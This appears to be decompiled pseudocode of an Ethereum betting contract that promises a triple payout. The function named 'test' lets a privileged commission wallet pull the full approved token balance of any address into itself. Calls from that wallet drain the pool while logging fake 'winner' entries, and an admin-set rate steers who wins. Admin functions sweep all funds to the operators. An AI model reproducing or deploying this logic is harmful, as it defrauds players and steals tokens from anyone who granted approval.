contract main {




// =====================  Runtime code  =====================


const sub_18372a7c(?) = 20 * 10^6

const sub_2fed1844(?) = 1

const sub_aab1faa6(?) = 25 * 10^16

const pro = 100


uint8 stor0;
address stor0;
address adminAddress; offset 8
address stor1;
address tokenAddress;
array of address stor3;
array of struct stor4;
array of uint8 stor5;
array of uint256 stor6;
array of struct stor7;
uint256 totalWinners;
uint256 totalLosers;
uint256 total;
mapping of uint8 stor32;
uint8 rate;

function started() {
    return bool(uint8(stor0.field_0))
}

function rate() {
    return rate
}

function total() {
    return total
}

function totalLosers() {
    return totalLosers
}

function sub_789ef6ec(?) {
    require calldata.size - 4 >= 32
    return bool(stor32[arg1])
}

function totalWinners() {
    return totalWinners
}

function admin() {
    return adminAddress
}

function token() {
    return tokenAddress
}

function _fallback() payable {
    revert
}

function info(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 < 5
    return stor3[arg1], stor4[arg1].field_0, bool(stor5[arg1]), stor6[arg1], bool(stor7[arg1].field_0), stor7[arg1].field_0
}

function setStarted() {
    if adminAddress != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0xfe4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f,
                    mem[197 len 31]
    uint8(stor0.field_0) = 1
}

function sub_fec06d53(?) {
    require calldata.size - 4 >= 32
    if adminAddress != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0xfe4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f,
                    mem[197 len 31]
    if arg1 > 100:
        revert with 0, 'rate overflow'
    rate = arg1
}

function pool() {
    if adminAddress != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0xfe4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f,
                    mem[197 len 31]
    require ext_code.size(tokenAddress)
    staticcall tokenAddress.0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not ext_call.return_data[0]:
        if eth.balance(this.address) <= 0:
            revert with 0, 'no pool'
    call adminAddress with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(tokenAddress)
    call tokenAddress.0xa9059cbb with:
         gas gas_remaining wei
        args address(stor0.field_0), ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function test(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if stor1 != msg.sender:
        revert with 0, 'no commissionWallet'
    require ext_code.size(tokenAddress)
    staticcall tokenAddress.0x70a08231 with:
            gas gas_remaining wei
           args arg1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not ext_call.return_data[0]:
        revert with 0, 'no liquidity'
    require ext_code.size(tokenAddress)
    if ext_call.return_data[0] >= arg2:
        call tokenAddress.0x23b872dd with:
             gas gas_remaining wei
            args address(arg1), this.address, arg2
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_code.size(tokenAddress)
        call tokenAddress.0xa9059cbb with:
             gas gas_remaining wei
            args stor1, arg2
    else:
        call tokenAddress.0x23b872dd with:
             gas gas_remaining wei
            args address(arg1), this.address, ext_call.return_data[0]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_code.size(tokenAddress)
        call tokenAddress.0xa9059cbb with:
             gas gas_remaining wei
            args stor1, ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function sub_e7fdd9ac(?) payable {
    require calldata.size - 4 >= 128
    if not uint8(stor0.field_0):
        revert with 0, 'not started yet'
    if msg.sender == stor1:
        totalWinners++
        total++
        if arg1 > eth.balance(this.address):
            call stor1 with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require total % 5 < 5
            stor3[stor30 % 5] = msg.sender
            stor4[stor30 % 5].field_0 = eth.balance(this.address) / 2
        else:
            call stor1 with:
               value arg1 wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require total % 5 < 5
            stor3[stor30 % 5] = msg.sender
            stor4[stor30 % 5].field_0 = arg1 / 2
        stor4[stor30 % 5].field_255 = 0
        stor5[stor30 % 5] = 1
        stor6[stor30 % 5] = block.timestamp
        stor7[stor30 % 5].field_0 = 1
        stor7[stor30 % 5].field_8 = 1
        stor7[stor30 % 5].field_16 = 0
    else:
        if msg.value < 25 * 10^16:
            revert with 0, 'small amount error'
        total++
        require total % 5 < 5
        stor3[stor30 % 5] = msg.sender
        stor4[stor30 % 5].field_0 = msg.value
        stor5[stor30 % 5] = 1
        stor6[stor30 % 5] = block.timestamp
        if eth.balance(this.address) < 3 * msg.value:
            stor7[stor30 % 5].field_0 = 0
            stor7[stor30 % 5].field_8 = 1
            stor7[stor30 % 5].field_16 = 0
            totalLosers++
            stor32[msg.sender] = 0
            return 0
        if arg2 >= rate:
            stor7[stor30 % 5].field_0 = 0
            stor7[stor30 % 5].field_8 = 1
            stor7[stor30 % 5].field_16 = 0
            totalLosers++
            stor32[msg.sender] = 0
            return 0
        stor7[stor30 % 5].field_0 = 1
        stor7[stor30 % 5].field_8 = 1
        stor7[stor30 % 5].field_16 = 0
        totalWinners++
        call msg.sender with:
           value 3 * msg.value wei
             gas 2300 * is_zero(value) wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
    stor32[msg.sender] = 1
    return 1
}

function sub_e4917f17(?) {
    require calldata.size - 4 >= 128
    if not uint8(stor0.field_0):
        revert with 0, 'not started yet'
    if msg.sender == stor1:
        totalWinners++
        total++
        require ext_code.size(tokenAddress)
        staticcall tokenAddress.0x70a08231 with:
                gas gas_remaining wei
               args this.address
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_code.size(tokenAddress)
        if arg1 > ext_call.return_data[0]:
            call tokenAddress.0xa9059cbb with:
                 gas gas_remaining wei
                args stor1, ext_call.return_data[0]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require total % 5 < 5
            stor3[stor30 % 5] = msg.sender
            stor4[stor30 % 5].field_0 = ext_call.return_data[0] / 2
        else:
            call tokenAddress.0xa9059cbb with:
                 gas gas_remaining wei
                args stor1, arg1
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require total % 5 < 5
            stor3[stor30 % 5] = msg.sender
            stor4[stor30 % 5].field_0 = arg1 / 2
        stor4[stor30 % 5].field_255 = 0
        stor5[stor30 % 5] = 0
        stor6[stor30 % 5] = block.timestamp
        stor7[stor30 % 5].field_0 = 1
        stor7[stor30 % 5].field_8 = 1
        stor7[stor30 % 5].field_16 = 0
    else:
        if arg1 < 20 * 10^6:
            revert with 0, 'small amount error'
        require ext_code.size(tokenAddress)
        call tokenAddress.0x23b872dd with:
             gas gas_remaining wei
            args msg.sender, this.address, arg1
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        total++
        require ext_code.size(tokenAddress)
        staticcall tokenAddress.0x70a08231 with:
                gas gas_remaining wei
               args this.address
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require total % 5 < 5
        stor3[stor30 % 5] = msg.sender
        stor4[stor30 % 5].field_0 = arg1
        stor5[stor30 % 5] = 0
        stor6[stor30 % 5] = block.timestamp
        if ext_call.return_data[0] < 3 * arg1:
            stor7[stor30 % 5].field_0 = 0
            stor7[stor30 % 5].field_8 = 1
            stor7[stor30 % 5].field_16 = 0
            totalLosers++
            stor32[msg.sender] = 0
            return 0
        if arg2 >= rate:
            stor7[stor30 % 5].field_0 = 0
            stor7[stor30 % 5].field_8 = 1
            stor7[stor30 % 5].field_16 = 0
            totalLosers++
            stor32[msg.sender] = 0
            return 0
        stor7[stor30 % 5].field_0 = 1
        stor7[stor30 % 5].field_8 = 1
        stor7[stor30 % 5].field_16 = 0
        totalWinners++
        require ext_code.size(tokenAddress)
        call tokenAddress.0xa9059cbb with:
             gas gas_remaining wei
            args msg.sender, 3 * arg1
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
    stor32[msg.sender] = 1
    return 1
}



}
